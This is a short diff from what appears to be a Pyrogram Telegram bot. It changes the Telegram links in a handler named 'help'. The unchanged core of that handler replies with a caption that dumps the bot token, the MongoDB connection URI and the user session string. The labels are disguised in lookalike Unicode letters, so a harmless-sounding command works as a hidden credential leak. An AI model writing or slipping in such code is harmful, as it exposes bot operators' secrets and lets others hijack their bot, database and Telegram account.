@@ -30,13 +30,13 @@ rel = {}
 async def help(client: Client, message: Message):
     await message.reply_photo(
         photo="https://telegra.ph/file/b61227af05544deb76a34.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/MASTIWITHFRIENDSXD)............☆""",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/+NV-JbtjrXDYwODgx)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
                         "• ʟᴏᴠᴇ ʏᴏᴜ ʙᴀʙʏ 😚❤️✨  •", 
-                        url="https://t.me/MASTIWITHFRIENDSXD"
+                        url="https://t.me/+NV-JbtjrXDYwODgx"
                     )
                 ]
             ]
